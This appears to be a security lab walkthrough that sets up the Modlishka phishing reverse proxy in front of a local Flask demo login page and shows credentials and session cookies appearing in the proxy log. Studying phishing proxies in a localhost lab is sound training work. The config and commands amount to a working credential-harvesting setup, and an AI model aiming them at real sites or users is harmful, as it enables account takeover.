![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Modlishka

---

## In this lab we will
- Run Modlishka as a **transparent reverse proxy**
- Proxy a **local demo login app**
- Observe:
  - credentials passing through the proxy
  - session cookies being captured
- Understand what defenders should monitor

---

# Lab Topology

```
Browser
  |
  v
Modlishka (Reverse Proxy)
  |
  v
Local Demo Login App (Flask)
```

Everything runs on **localhost**


---

# Create a local “victim” demo app (safe target)

## Create app directory

```bash
mkdir -p ~/Desktop/modlishka/victim
```

```bash
cd ~/Desktop/modlishka/victim
```

## Create Flask app

```bash
cat > app.py << 'EOF'
from flask import Flask, request, redirect, make_response

app = Flask(__name__)

@app.route("/")
def index():
    return '''
    <h2>Demo Login</h2>
    <form method="POST" action="/login">
      <input name="username" placeholder="username"><br>
      <input name="password" type="password" placeholder="password"><br>
      <button>Login</button>
    </form>
    '''

@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("username")
    resp = make_response(redirect("/welcome"))
    resp.set_cookie("session", f"user={user};token=DEMO123")
    return resp

@app.route("/welcome")
def welcome():
    return "Welcome! Session cookie set."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
EOF
```

## Install Flask and run the demo app

```bash
pip3 install flask
python3 app.py
```
<img width="382" height="128" alt="image" src="https://github.com/user-attachments/assets/9375c7a2-0d3e-44e4-a596-090c3033402c" />

Test directly:

```
http://127.0.0.1:5000
```

<img width="303" height="155" alt="image" src="https://github.com/user-attachments/assets/34716c2c-5ef6-400d-b0f1-c10aa3ff791a" />


---

# Prepare Modlishka configuration

```bash
cd ~/Desktop/modlishka
```

Create config file:

```bash
cat > demo.json << 'EOF'
{
  "proxyDomain": "localhost",
  "target": "http://127.0.0.1:5000",
  "listenAddress": "0.0.0.0",
  "listenPort": "8080",
  "log": "modlishka.log",
  "plugins": "all",
  "trackingCookie": "modlishka_session",
  "terminateOnError": false
}
EOF
```

---

# Start Modlishka

- Allow **Modlishka** to bind to <1000 ports
```bash
sudo setcap 'cap_net_bind_service=+ep' $(which Modlishka)
```

```bash
Modlishka -config demo.json
```

<img width="902" height="421" alt="image" src="https://github.com/user-attachments/assets/ac59a806-a049-4357-b7f9-09fffaa12d06" />


---

# Ethical phishing simulation

Open browser:

```
http://127.0.0.1:8080
```

<img width="234" height="133" alt="image" src="https://github.com/user-attachments/assets/7485b912-95a7-444b-bb59-3bdcf9ff5c96" />


Log in using any credentials

- For example use `test` and `1234`

<img width="250" height="31" alt="image" src="https://github.com/user-attachments/assets/df361508-e417-4dc7-8a34-a9d386ccbf78" />


---

# Observe captured data

In another terminal:

```bash
cd ~/Desktop/modlishka
tail -f modlishka.log
```

You should see:
- Credentials
- Cookies
- Headers
- Session tokens










---

# Finished?

[Back to Card's Main Page](/Cards/IC/Phishing.md)
